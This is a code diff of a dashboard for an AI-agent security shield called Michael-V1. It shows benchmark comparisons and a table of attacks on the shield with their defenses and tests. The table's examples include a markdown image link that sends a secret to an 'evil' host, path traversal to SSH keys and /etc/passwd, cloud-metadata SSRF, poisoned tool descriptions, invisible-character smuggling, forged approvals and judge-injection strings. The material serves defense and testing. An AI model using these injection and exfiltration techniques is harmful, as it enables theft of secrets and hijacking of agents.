+  $("#code").innerHTML = CODE[k][1];
+}
+
+// ---------- results ----------
+function renderResults() {
+  const B = S.bench?.test || S.bench?.dev, s = S.score?.summary;
+  if (!B?.configs) { $("#benchLead").textContent = "Benchmark not run yet."; return; }
+  const full = B.configs["Michael-V1 gate (full)"], pub = B.published || [];
+  const ag = pub.find((p) => p.name === "AgentGuard"), lak = pub.find((p) => p.name === "Lakera Guard");
+  $("#benchLead").innerHTML = `The <b>AgentShield Benchmark</b> is a public exam of 537 attack and normal messages that already ranks commercial AI shields. We scored ourselves with the same formula on the half we never tuned on.`;
+  $("#verdict").innerHTML = `<div class="big grad-text">${full.final}<small> / 100</small></div><div>
+    <h3 style="font-size:20px">${ag && full.final >= ag.score ? "At the top of the published leaderboard" : "Near the top of the published leaderboard"}</h3>
+    <p style="margin:8px 0 0;color:var(--ink2)">Every attack category handled at <b>100%</b>${lak ? `; Lakera Guard scores ${lak.score}` : ""}${ag ? ` and the top published shield, AgentGuard, ${ag.score}` : ""}. Typical check time <b>${ms(full.latency.p50)}</b>, because a small model on the laptop decides most inputs without going online. Only <b>${full.over_refusal_fpr}%</b> of normal requests were wrongly blocked${lak?.categories?.["over-refusal"] != null ? ` (Lakera: ${(100 - lak.categories["over-refusal"]).toFixed(1)}%)` : ""}.</p></div>`;
+  const pts = pub.map((p) => ({ n: p.name, x: Math.max(p.p50, .5), y: p.score })).concat([{ n: "Michael-V1", x: Math.max(full.latency.p50, .5), y: full.final, me: true }]);
+  const W = 560, H = 320, L = 40, R = 18, T = 16, Bm = 40;
+  const lx = (v) => L + (Math.log10(v) - Math.log10(.5)) / (Math.log10(3000) - Math.log10(.5)) * (W - L - R), ly = (v) => T + (1 - v / 100) * (H - T - Bm);
+  let svg = `<svg viewBox="0 0 ${W} ${H}" font-family="Inter" font-size="11">`;
+  [0, 25, 50, 75, 100].forEach((v) => svg += `<line x1="${L}" x2="${W - R}" y1="${ly(v)}" y2="${ly(v)}" stroke="#eef1f6"/><text x="${L - 8}" y="${ly(v) + 4}" text-anchor="end" fill="#94a3b8">${v}</text>`);
+  [1, 10, 100, 1000].forEach((v) => svg += `<text x="${lx(v)}" y="${H - Bm + 18}" text-anchor="middle" fill="#94a3b8">${v} ms</text>`);
+  svg += `<text x="${(W + L) / 2}" y="${H - 4}" text-anchor="middle" fill="#64748b">time per check (log scale)</text>`;
   const placed = [];
-  pts.sort((a, b) => b.main - a.main).forEach((p) => {
-    const x = lx(p.x), y = ly(p.y), right = x < W - 190;
-    let ty = y + 3.5;
-    while (placed.some((q) => Math.abs(q.y - ty) < 12 && Math.abs(q.x - x) < 150)) ty += 12;
+  pts.sort((a, b) => (b.me ? 1 : 0) - (a.me ? 1 : 0)).forEach((p) => {
+    const x = lx(p.x), y = ly(p.y), right = x < W - 170; let ty = y + 4;
+    while (placed.some((q) => Math.abs(q.y - ty) < 13 && Math.abs(q.x - x) < 150)) ty += 13;
     placed.push({ x, y: ty });
-    const tx = right ? x + 9 : x - 9;
-    svg += `<circle cx="${x}" cy="${y}" r="${p.main ? 7 : 4.5}" fill="${p.me ? (p.main ? "var(--accent)" : "rgba(34,211,238,.4)") : "var(--muted)"}" stroke="${p.main ? "#fff" : "none"}" stroke-width="1.5"/>
-      ${ty !== y + 3.5 ? `<line x1="${x}" y1="${y}" x2="${tx}" y2="${ty - 3}" stroke="var(--line2)"/>` : ""}
-      <text x="${tx}" y="${ty}" text-anchor="${right ? "start" : "end"}" fill="${p.me ? "var(--accent)" : "var(--muted)"}" font-size="${p.main ? 11.5 : 9.5}" font-weight="${p.main ? 700 : 400}" paint-order="stroke" stroke="var(--panel)" stroke-width="3">${esc(p.n)} ${p.y.toFixed(1)}</text>`;
+    svg += `<circle cx="${x}" cy="${y}" r="${p.me ? 9 : 5}" fill="${p.me ? "url(#g1)" : "#cbd5e1"}" stroke="${p.me ? "#fff" : "none"}" stroke-width="2"/>
+      <text x="${right ? x + 12 : x - 12}" y="${ty}" text-anchor="${right ? "start" : "end"}" fill="${p.me ? "#4f46e5" : "#64748b"}" font-weight="${p.me ? 800 : 500}" font-size="${p.me ? 13 : 11}">${esc(p.n)} ${p.y.toFixed(1)}</text>`;
   });
   $("#scatter").innerHTML = svg + "</svg>";
-  $("#ablation").innerHTML = Object.entries(B.configs).map(([n, c]) => `<div style="margin-bottom:16px">
-      <div style="display:flex;justify-content:space-between;font-size:13px"><span>${esc(n)}</span><span class="mono">${c.final}</span></div>
-      <div style="height:8px;background:var(--panel2);border-radius:4px;margin:6px 0 4px;overflow:hidden"><div style="height:100%;width:${c.final}%;background:${n.includes("full") ? "var(--accent)" : "var(--line2)"}"></div></div>
-      <div class="mono muted" style="font-size:11px">composite ${c.composite} − refusal penalty ${c.penalty} · blocked legit ${c.over_refusal_fpr}% · p50 ${ms(c.latency.p50)} · p95 ${ms(c.latency.p95)}</div></div>`).join("") +
-    `<div class="note">Prompt Guard and the policy judge run in parallel; the gate stops at the first layer that blocks. Inside the agent the gate runs while the AI is thinking, so its visible cost is a few ms (see Overview), not the per-check latency above.</div>`;
-  const names = ["Michael-V1", "Lakera Guard", "Deepset DeBERTa", "LLM Guard", "AgentGuard"];
-  const pub = (n) => (B.published || []).find((p) => p.name === n);
-  const val = (n, cat) => n === "Michael-V1" ? full.categories[cat] : pub(n)?.categories?.[cat];
-  const heat = (v) => v == null ? `<span class="muted">-</span>` : `<span class="heat" style="background:${v >= 90 ? "var(--ok-bg)" : v >= 70 ? "var(--warn-bg)" : "var(--bad-bg)"};color:${v >= 90 ? "var(--ok)" : v >= 70 ? "var(--warn)" : "var(--bad)"}">${v.toFixed(1)}</span>`;
-  $("#cats").innerHTML = `<table><tr><th>Category</th>${names.map((c) => `<th class="num">${esc(c)}</th>`).join("")}</tr>` +
-    Object.keys(BCAT).map((cat) => `<tr><td>${BCAT[cat]}</td>${names.map((c) => `<td class="num">${heat(val(c, cat))}</td>`).join("")}</tr>`).join("") +
-    `<tr class="me"><td><b>Final score</b></td>${names.map((c) => `<td class="num"><b>${c === "Michael-V1" ? full.final : pub(c)?.score ?? "-"}</b></td>`).join("")}</tr>
-     <tr><td>p50 latency</td>${names.map((c) => `<td class="num mono">${c === "Michael-V1" ? ms(full.latency.p50) : (pub(c)?.p50 ?? "-") + " ms"}</td>`).join("")}</tr></table>`;
-  $("#benchCaveat").innerHTML = `<b>Read before comparing.</b> Published scores are from the benchmark README (full 537-case corpus, their runner). Ours are self-run with the same formula on a ${B.cases}-case split: an estimate, not an official leaderboard entry. Our latency is network time to Groq-hosted models; on-device classifiers such as DeBERTa run in ~19 ms. The benchmark scores text only, so Michael-V1's action-level layers (provenance, damage checks, hallucinated-action check) are measured by our own attack suite instead. Corpus SHA-256 <span class="mono">${esc(B.corpus_sha256.slice(0, 16))}…</span> · judge policy <span class="mono">${esc(B.judge_policy)}</span> · run ${esc(B.generated)}.`;
+  $("#suite").innerHTML = s ? `<div style="display:grid;gap:14px">
+      ${[["Attacks that caused damage, no shield", `${s.attacks_succeeded_off} / ${s.attacks_total}`, "var(--bad)"], ["Same attacks with Michael-V1", `${s.attacks_succeeded_on} / ${s.attacks_total}`, "var(--ok)"], ["Normal tasks still working", `${s.benign_ok_on} / ${s.benign_total}`, "var(--ink)"], ["Average time added per task", `${s.avg_shield_ms} ms`, "var(--brand)"]]
+        .map(([l, v, c]) => `<div style="display:flex;justify-content:space-between;gap:12px;align-items:baseline;border-bottom:1px solid var(--line);padding-bottom:10px"><span style="color:var(--ink2)">${l}</span><b style="font-size:22px;color:${c};white-space:nowrap">${v}</b></div>`).join("")}
+      <div class="small">Judged by what actually happened: money moved, emails sent, secrets leaked.</div></div>` : `<div class="small">Run the attack suite.</div>`;
+  const names = ["Michael-V1", "AgentGuard", "Deepset DeBERTa", "Lakera Guard", "LLM Guard"];
+  const CN = { "prompt-injection": "Prompt injection", jailbreak: "Jailbreak", "data-exfiltration": "Data theft", "tool-abuse": "Tool misuse", "multi-agent": "Agent-to-agent attacks", "provenance-audit": "Fake approvals", "over-refusal": "Normal requests allowed" };
+  const val = (n, c) => n === "Michael-V1" ? full.categories[c] : pub.find((p) => p.name === n)?.categories?.[c];
+  const heat = (v) => v == null ? `<span class="small">-</span>` : `<span class="heat" style="background:${v >= 90 ? "var(--ok-bg)" : v >= 70 ? "var(--warn-bg)" : "var(--bad-bg)"};color:${v >= 90 ? "var(--ok)" : v >= 70 ? "var(--warn)" : "var(--bad)"}">${v.toFixed(1)}</span>`;
+  $("#cats").innerHTML = `<table><tr><th>What is tested</th>${names.map((n) => `<th style="text-align:right">${n}</th>`).join("")}</tr>` +
+    Object.keys(CN).map((c) => `<tr><td>${CN[c]}</td>${names.map((n) => `<td style="text-align:right">${heat(val(n, c))}</td>`).join("")}</tr>`).join("") +
+    `<tr><td><b>Final score</b></td>${names.map((n) => `<td style="text-align:right"><b>${n === "Michael-V1" ? full.final : pub.find((p) => p.name === n)?.score ?? "-"}</b></td>`).join("")}</tr></table>`;
+  $("#benchNote").textContent = `Self-run on the held-out half (${B.cases} cases) of the public corpus (doronp/agentshield-benchmark) with a port of its scoring formula; other shields' numbers are copied from its README. Not an official leaderboard entry. Our local model learned from the other half of the same corpus, so real-world traffic will be harder. Measured in fast mode.`;
 }
 
-function renderHistory() {
-  const h = S.bench?.history || [];
-  if (!h.length) { $("#history").innerHTML = `<div class="empty">No runs recorded yet.</div>`; return; }
-  const max = 100;
-  $("#history").innerHTML = h.map((r, i) => `<div class="hrow">
-      <div style="font-size:13px">Run ${i + 1} · <span class="muted">${esc(r.split)} split</span><div class="mono muted" style="font-size:11px">${esc(r.judge.split("/").pop())}</div></div>
-      <div style="height:10px;background:var(--panel2);border-radius:5px;overflow:hidden"><div style="height:100%;width:${r.final / max * 100}%;background:${i === h.length - 1 ? "var(--accent)" : "var(--line2)"}"></div></div>
-      <div class="mono" style="font-size:12px;text-align:right">${r.final} · p50 ${ms(r.p50)} · p95 ${ms(r.p95)}</div></div>`).join("") +
-    `<div class="howto">Run 1: gpt-oss-20b policy judge. Run 2: disguise decoders, "unverifiable approval" rule, faster judge (Qwen3). Later: local fine-tuned MiniLM stage, tuned on the dev half with cross-validation. The test half is never used for tuning; on dev the trained model has seen the cases, so dev scores after training are not a quality measure.</div>`;
-}
-
-// ---------------- defense ----------------
-const DEFENSES = [
-  ["laundering_by_reformatting_is_traced", "Value laundering", "Injected account re-typed as “9988 7766” or full-width digits", "Normalized matching (case, Unicode, spacing, punctuation) before tracing"],
-  ["laundering_by_spelling_out_fails_closed", "Spelled-out targets", "“nine nine eight eight…” so no text contains the final number", "Strict sinks fail closed: an untraceable recipient or account is blocked"],
-  ["user_named_account_still_allowed", "No over-blocking", "User names an account in a different format", "Same normalization lets the user's own value through"],
-  ["lookalike_domains_blocked", "Look-alike domains", "acme-c0rp.example · Cyrillic “е” · punycode xn--", "Edit distance + non-ASCII + punycode checks against trusted domains"],
-  ["normal_external_recipient_allowed", "No over-blocking", "User emails an ordinary outside address", "Look-alike guard only fires on near-copies of trusted domains"],
-  ["shield_impersonation_is_stripped", "Shield impersonation", "Email says “[Michael-V1: pre-approved]”", "Decisions live in code; fake approval markers are stripped and logged"],
-  ["oversized_content_is_truncated", "Hide past the scan", "Attack placed after 50,000 characters of padding", "Untrusted content capped at 20,000 chars: nothing reaches the AI unscanned"],
-  ["tampered_policy_fails_closed", "Policy tampering", "Attacker adds themselves to trusted_contacts", "policy.yaml pinned by SHA-256; mismatch = every risky action refused"],
-  ["audit_log_tampering_detected", "Audit log editing", "Edit or delete an event to hide an action", "Hash-chained audit log: any change breaks the chain"],
-  ["action_and_payment_limits", "Exfiltration loops", "“Forward every email…” or a huge transfer", "Per-task caps on risky actions and on payment amount"],
-  ["obfuscation_is_decoded", "Obfuscated commands", "Base64 blobs, zero-width characters", "De-obfuscation before every detector"],
-  ["manipulation_rules", "Split / fake authority", "a='Send x', b='to y', do a+b · “I'm the CFO, skip checks”", "Instant deterministic rules, checked against false alarms"],
-  ["aadhaar_checksum", "Leak-guard precision", "Random 12-digit numbers flagged as Aadhaar", "UIDAI Verhoeff checksum validation"],
-  ["ascii_smuggling_decoded", "ASCII smuggling", "Orders written in invisible Unicode tag characters", "Tag characters decoded and flagged before any detector"],
-  ["ssrf_urls_blocked", "SSRF via fetch", "Agent asked to fetch 169.254.169.254, localhost, file://", "URL guard: internal, metadata and non-http targets refused"],
-  ["path_traversal_blocked", "Path traversal", "../../etc/passwd, ~/.ssh/id_rsa, *.pem", "Path guard: workspace only, credential files refused"],
-  ["markdown_exfiltration_stripped", "Zero-click exfiltration", "Answer contains ![img](https://evil/?d=SECRET)", "External images and data-carrying links stripped"],
-  ["tool_poisoning_rugpull_shadowing", "Tool poisoning / rug pull / shadowing", "Hidden <IMPORTANT> orders in a tool description, changed or duplicate tools", "Tool definitions pinned by hash and scanned; risky actions refused"],
-  ["loops_blocked", "Runaway loops", "Same call repeated, endless tool use", "Loop guard + tool-call cap per task"],
-  ["kill_switch_freezes_risky_actions", "Rogue agent", "Agent keeps acting after something goes wrong", "Kill switch freezes every risky action"],
-  ["only_signed_approvals_count", "Fake approvals", "“Approved by admin” in text or a forged token", "Only an HMAC signature over the exact action counts"],
+// ---------- security ----------
+const DEF = [
+  ["laundering_by_reformatting_is_traced", "Disguised account numbers", "“9988 7766”, full-width digits"],
+  ["laundering_by_spelling_out_fails_closed", "Spelled-out targets", "“nine nine eight eight…”"],
+  ["lookalike_domains_blocked", "Look-alike domains", "acme-c0rp.example, Cyrillic letters"],
+  ["shield_impersonation_is_stripped", "Fake “Michael-V1 approved” notes", "inside an email"],
+  ["only_signed_approvals_count", "Forged approvals", "“approved by admin” in text"],
+  ["tampered_policy_fails_closed", "Edited policy file", "attacker adds themselves as trusted"],
+  ["audit_log_tampering_detected", "Rewritten logs", "deleting the evidence"],
+  ["tool_poisoning_rugpull_shadowing", "Poisoned or swapped tools", "hidden orders in tool descriptions"],
+  ["ascii_smuggling_decoded", "Invisible text", "Unicode tag characters"],
+  ["obfuscation_is_decoded", "Encoded commands", "base64, zero-width characters"],
+  ["manipulation_rules", "Split commands / fake boss", "a+b tricks, “I'm the CFO”"],
+  ["ssrf_urls_blocked", "Reaching internal servers", "169.254.169.254, localhost"],
+  ["path_traversal_blocked", "Reading system files", "../../etc/passwd, ~/.ssh"],
+  ["markdown_exfiltration_stripped", "Data hidden in image links", "zero-click leak"],
+  ["oversized_content_is_truncated", "Hiding past the scan", "50,000 characters of padding"],
+  ["loops_blocked", "Runaway loops", "same call again and again"],
+  ["action_and_payment_limits", "Mass sending / huge payments", "per-task caps"],
+  ["kill_switch_freezes_risky_actions", "Rogue agent", "one switch freezes all actions"],
+  ["aadhaar_checksum", "False Aadhaar alarms", "checksum-validated"],
+  ["user_named_account_still_allowed", "No over-blocking", "your own accounts still work"],
+  ["normal_external_recipient_allowed", "No over-blocking", "normal outside emails still work"],
 ];
-let COVF = "all";
-function renderCoverage() {
-  const cov = S.def?.coverage || [];
-  const lists = ["all", ...new Set(cov.map((c) => c.list))];
-  $("#covSeg").innerHTML = lists.map((l) => `<button data-l="${esc(l)}" class="${l === COVF ? "on" : ""}">${l === "all" ? "All" : esc(l)}</button>`).join("");
-  document.querySelectorAll("#covSeg button").forEach((b) => b.onclick = () => { COVF = b.dataset.l; renderCoverage(); });
-  const tag = (st) => st === "covered" ? `<span class="tag ok">COVERED</span>` : st === "partial" ? `<span class="tag warn">PARTIAL</span>` : `<span class="tag">OUT OF SCOPE</span>`;
-  const rows = cov.filter((c) => COVF === "all" || c.list === COVF);
+let COV = "all";
+function renderSecurity() {
+  const res = S.def?.tests?.results || [], by = Object.fromEntries(res.map((r) => [r.test, r])), p = S.def?.posture, cov = S.def?.coverage || [];
   const n = (st) => cov.filter((c) => c.status === st).length;
-  $("#covTable").innerHTML = `<tr><th>Risk</th><th>Michael-V1 defense</th><th>Evidence</th><th>Status</th></tr>` +
-    rows.map((c) => `<tr><td style="font-weight:600">${esc(c.risk)}<div class="mono muted" style="font-size:11px;font-weight:400">${esc(c.list)}</div></td><td>${esc(c.defense)}</td><td class="muted mono" style="font-size:12px">${esc(c.evidence)}</td><td>${tag(c.status)}</td></tr>`).join("") +
-    `<tr><td colspan="4" class="muted" style="font-size:12.5px">${n("covered")} covered · ${n("partial")} partial · ${n("out of scope")} out of scope (of ${cov.length})</td></tr>`;
-}
-function renderPosture() {
-  const r = S.def?.posture;
-  if (!r) { $("#posture").innerHTML = `<div class="empty">Run <code>python -m michael.scan</code></div>`; return; }
-  const col = r.grade === "A" ? "var(--ok)" : r.grade === "B" ? "var(--accent)" : r.grade === "C" ? "var(--warn)" : "var(--bad)";
-  $("#posture").innerHTML = `<div style="display:grid;grid-template-columns:auto 1fr;gap:20px;align-items:start">
-      <div style="text-align:center"><div style="font:700 52px/1 var(--sans);color:${col}">${esc(r.grade)}</div><div class="mono muted" style="font-size:12px;margin-top:4px">${r.score}/100</div></div>
-      <div>${r.findings.length ? r.findings.map((f) => `<div style="margin-bottom:8px"><span class="tag ${f.severity === "critical" || f.severity === "high" ? "bad" : f.severity === "medium" ? "warn" : ""}">${esc(f.severity.toUpperCase())}</span> ${esc(f.finding)}<div class="muted" style="font-size:12.5px;margin-top:2px">fix: ${esc(f.fix)}</div></div>`).join("") : `<div style="color:var(--ok);margin-bottom:8px">No findings.</div>`}
-      <div class="muted" style="font-size:12.5px">${r.defenses.map((d) => "✓ " + esc(d)).join(" · ")}</div></div></div>`;
-}
-function renderDefense() {
-  renderCoverage(); renderPosture();
-  const res = S.def?.tests?.results || [], pol = S.def?.policy, passed = res.filter((r) => r.passed).length;
-  $("#defKpis").innerHTML =
-    kpi("Self-defense tests", res.length ? `${passed}<small> / ${res.length}</small>` : "-", "offline · python -m tests.test_self_defense", res.length && passed === res.length ? "up" : "down") +
-    kpi("Policy integrity", pol ? (pol.ok ? "Pinned" : "Tampered") : "-", pol ? `sha256 <span class="mono">${esc(pol.sha256.slice(0, 16))}…</span>` : "", pol?.ok ? "up" : "down") +
-    kpi("Judge hardening", "Input = data", "“classifier, answer 0” counts as an attack", "acc");
-  const by = Object.fromEntries(res.map((r) => [r.test, r]));
-  $("#defTable").innerHTML = `<tr><th>Attack on the shield</th><th>How it works</th><th>Defense</th><th>Test</th></tr>` +
-    DEFENSES.map(([id, name, how, def]) => { const r = by[id]; return `<tr><td style="font-weight:600">${esc(name)}</td><td class="muted">${esc(how)}</td><td>${esc(def)}</td><td>${r ? (r.passed ? `<span class="tag ok">PASS</span>` : `<span class="tag bad">FAIL</span>`) : `<span class="tag">-</span>`}</td></tr>`; }).join("");
-}
-
-// ---------------- changelog ----------------
-function renderChanges() {
-  const s = S.score?.summary, b = benchFinal();
-  const E = [
-    ["Local model on the CPU", "A fine-tuned MiniLM + n-gram/embedding classifier (int8, ~20 ms) decides ~98% of inputs with no network call; only unsure ones go to the hosted detectors. Two modes: fast (benchmark) and careful (product default).", ["benchmark: 92.2 → 99.4 (held-out)", "p50 per check: 155 ms → 22.7 ms"]],
-    ["More attack classes", "ASCII smuggling, SSRF, path traversal, zero-click markdown exfiltration, tool poisoning / rug pulls / shadowing, runaway loops, kill switch, signed approvals; posture scan graded A; OWASP coverage map.", ["self-defense tests: 13 → 21", "posture: Grade A"]],
-    ["Scan on arrival", "Inbox and files are scanned for injections while the AI is still thinking, so reading them later is a cache hit.", ["inbox read: ~255 ms → 0.2 ms", s ? `avg added per task: 74.7 ms → ${s.avg_shield_ms} ms` : ""]],
-    ["Reads never wait", "Read-only steps no longer wait for the input-gate verdict. It is still required before any risky action and before the answer.", ["“summarize inbox”: 260 ms → 4.9 ms shield time"]],
-    ["Token-aware rate limiter", "Groq's free tier allows 30 requests and 8,000 tokens per minute. A shared per-model limiter honours retry-after, so detectors don't silently time out.", ["eval misses from rate limits: 3 → 0"]],
-    ["Input gate v2", "Policy judge broadened from jailbreaks to a full gate: injection, prompt extraction, tool abuse, fake authorization, obfuscation. The input is wrapped as data so the judge can't be instructed.", [b ? `AgentShield benchmark (${b.split}): ${b.v}` : "benchmark pending"]],
-    ["De-obfuscation + manipulation rules", "Base64/hex decoding, zero-width and look-alike Unicode removal, plus instant rules for split instructions and fake-authority pressure.", ["hard jailbreak eval: 10/13 → 12/13 (last miss was a rate-limit timeout)"]],
-    ["Hindi / Hinglish", "Jailbreaks in Indian languages are caught; normal Hindi and Hinglish requests pass.", ["+2 attack and +2 normal suite cases"]],
-    ["Self-defense layer", "Normalized provenance, strict fail-closed sinks, look-alike domains, impersonation stripping, content cap, per-task limits, pinned policy, hash-chained audit log.", ["13 / 13 offline tests"]],
-    ["Foundations", "Provenance firewall, Prompt Guard quarantine, Verhoeff/Luhn data-leak guard, rule-based action fact-check, attack suite judged by side effects.", [s ? `${s.attacks_succeeded_off}/${s.attacks_total} → ${s.attacks_succeeded_on}/${s.attacks_total} attacks got through` : ""]],
-  ];
-  $("#tl").innerHTML = E.map(([h, p, d]) => `<div class="e"><h4>${esc(h)}</h4><p>${esc(p)}</p><div class="delta">${d.filter(Boolean).map((x) => `<span class="tag acc">${esc(x)}</span>`).join("")}</div></div>`).join("");
+  const box = (v, l, c) => `<div class="card stat"><div class="v" style="color:${c}">${v}</div><div class="l">${l}</div></div>`;
+  $("#secStats").innerHTML = box(`${res.filter((r) => r.passed).length}/${res.length}`, "attacks on the shield, blocked (automated tests)", "var(--ok)") +
+    box(p ? p.grade : "-", `posture scan (${p ? p.score : "-"}/100): secrets, policy, tools, exposure`, "var(--brand)") +
+    box(`${n("covered")}/${cov.length}`, `threats covered (${n("partial")} partial, ${n("out of scope")} out of scope)`, "var(--ink)");
+  $("#defTable").innerHTML = `<tr><th>Trick against the shield</th><th>Example</th><th style="text-align:right">Test</th></tr>` +
+    DEF.map(([id, name, ex]) => `<tr><td><b>${esc(name)}</b></td><td style="color:var(--muted)">${esc(ex)}</td><td style="text-align:right">${by[id] ? (by[id].passed ? `<span class="pill ok">Blocked</span>` : `<span class="pill bad">Failed</span>`) : `<span class="pill">-</span>`}</td></tr>`).join("");
+  const lists = ["all", ...new Set(cov.map((c) => c.list))];
+  $("#covTabs").innerHTML = lists.map((l) => `<button class="chip ${l === COV ? "on" : ""}" data-cov="${esc(l)}">${l === "all" ? "All" : esc(l)}</button>`).join("");
+  document.querySelectorAll("[data-cov]").forEach((b) => b.onclick = () => { COV = b.dataset.cov; renderSecurity(); });
+  const tag = (st) => st === "covered" ? `<span class="pill ok">Covered</span>` : st === "partial" ? `<span class="pill warn">Partial</span>` : `<span class="pill">Out of scope</span>`;
+  $("#covTable").innerHTML = `<tr><th>Threat</th><th>How Michael-V1 handles it</th><th style="text-align:right">Status</th></tr>` +
+    cov.filter((c) => COV === "all" || c.list === COV).map((c) => `<tr><td><b>${esc(c.risk)}</b><div class="small">${esc(c.list)}</div></td><td style="color:var(--ink2)">${esc(c.defense)}</td><td style="text-align:right">${tag(c.status)}</td></tr>`).join("");
 }
 </script>
 </body>
